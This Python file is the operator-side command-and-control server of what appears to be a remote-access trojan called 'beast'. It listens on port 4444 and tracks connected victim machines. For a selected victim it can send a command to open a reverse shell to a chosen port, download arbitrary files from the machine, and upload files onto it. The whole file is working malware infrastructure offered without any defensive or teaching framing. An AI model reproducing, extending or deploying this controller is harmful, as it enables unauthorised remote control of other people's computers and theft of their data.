import socket
import threading
import os

clients = []
HOST = "127.0.0.1"
PORT = 4444

def listener():
    try:
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST,PORT))
        server.listen(5)
        while True:
            client,_ = server.accept()
            name = client.recv(1024).decode("utf-8").strip()
            clients.append({"client":client,"name":name})
    except Exception as e:
        print(e)

def alive(sock):
    try:
        sock.sendall("PING".encode())
        sock.recv(1024)
        return True
    except:
        return False

def update():
    try:
        for i in range(len(clients)):
            if not alive(clients[i]["client"]):
                del clients[i]
    except Exception as e:
        print(e)

def ls():
    try:
        for i,client in enumerate(clients):
            print(str(i)+"."+client["name"])
    except Exception as e:
        print(e)

def start_shell(client):
    port = input("PORT:")
    client.sendall(f"SHELL\n{port}".encode())

def give_file(client):
    try:
        target_loc = input("TARGET FILE:")
        save_to = input("SAVE TO:")
        file_name = target_loc.split("/")[-1]
        client.sendall(f"GIVE\n{target_loc}".encode())
        size = client.recv(1024).decode("utf-8").strip()
        if size == "FAILED":
            print("FAILED")
            return
        size = int(size)
        file = open(os.path.join(save_to,file_name),"wb")
        acc = 0
        client.send("OK".encode())
        data = client.recv(1024)
        acc += len(data)
        while data:
            print(f"{acc}/{size}",end="\r")
            file.write(data)
            if acc == size:
                print()
                break
            data = client.recv(1024)
            acc += len(data)
        file.close()
        print(f"SAVED:{os.path.join(save_to,file_name)}")
    except Exception as e:
        print(e)

def take_file(client):
    try:
        target_loc = input("TARGET FILE:")
        save_to = input("SAVE TO:")
        file_name = target_loc.split("/")[-1]
        dest = os.path.join(save_to,file_name)
        file_size = os.stat(target_loc).st_size
        client.sendall(f"TAKE\n{dest}\n{file_size}".encode())
        res = client.recv(1024).decode().strip()
        if res == "FAILED":
            print(res)
            return
        file = open(target_loc,"rb")
        acc = 0
        data = file.read(1024)
        acc += len(data)
        while data:
            client.sendall(data)
            print(f"{acc}/{file_size}",end="\r")
            data = file.read(1024)
            acc += len(data)
        file.close()
        print()
        print(f"WRITTEN:{dest}") 
    except Exception as e:
        print(e)

def beast(i):
    try:
        client = clients[i]
    except:
        return
    while True:
        cmd = input(f"{client['name']}>")
        if cmd == "clear":
            os.system("clear")
        elif cmd == "exit":
            return
        elif cmd == "shell":
            start_shell(client["client"])
        elif cmd == "give":
            give_file(client["client"])
        elif cmd == "take":
            take_file(client["client"])

def main():
    while True:
        cmd = input("beast>")
        if cmd == "clear":
            os.system("clear")

        elif cmd == "exit":
            quit()

        elif "select" in cmd:
            try:
                beast(int(cmd.split(" ")[1]))
            except:
                continue

        elif cmd == "ls":
            ls()

if __name__ == "__main__":
    threading.Thread(target=listener,daemon=True).start()
    main()